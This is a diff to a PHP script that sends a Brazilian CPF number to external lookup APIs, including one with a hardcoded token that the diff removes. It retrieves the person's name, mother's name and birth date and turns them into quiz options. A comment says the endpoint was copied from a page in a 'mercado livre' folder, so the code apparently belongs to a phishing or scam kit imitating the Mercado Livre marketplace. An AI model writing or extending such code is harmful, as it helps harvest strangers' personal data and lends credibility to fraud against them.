@@ -18,9 +18,8 @@ if (strlen($cpf) !== 11) {
     exit;
 }
 
-// Endpoint da API externa
-$token = 'e950549e-01af-4fb6-8788-051268c4156e';
-$url = "https://apela-api.tech?user={$token}&cpf={$cpf}";
+// Endpoint da API externa (encontrada em 'mercado livre/ml/4/index.html')
+$url = "https://encurtaapi.com/api/typebot?cpf={$cpf}";
 
 // Tenta chamar via cURL (mais robusto que file_get_contents)
 $ch = curl_init();
@@ -86,18 +85,19 @@ if (isset($data['erro'])) {
 }
 
 // Retorna os dados originais esperados pelo JS
+// A API encurtaapi retorna chaves em MAIÚSCULO: NOME, MAE, NASCIMENTO
 $dados_originais = [
     'cpf' => $cpf,
-    'nome' => $data['nome'] ?? '',
-    'nome_mae' => $data['mae'] ?? '',
-    'data_nascimento' => $data['nascimento'] ?? ''
+    'nome' => $data['NOME'] ?? ($data['nome'] ?? ''),
+    'nome_mae' => $data['MAE'] ?? ($data['mae'] ?? ''),
+    'data_nascimento' => $data['NASCIMENTO'] ?? ($data['nascimento'] ?? '')
 ];
 
 // Dados extras para o quiz
 $quiz = [
-    'nomes' => gerarOpcoes($data['nome']),
-    'maes' => gerarOpcoes($data['mae']),
-    'datas' => gerarOpcoes($data['nascimento'], 'data')
+    'nomes' => gerarOpcoes($dados_originais['nome']),
+    'maes' => gerarOpcoes($dados_originais['nome_mae']),
+    'datas' => gerarOpcoes($dados_originais['data_nascimento'], 'data')
 ];
 
 // Retorna resposta JSON
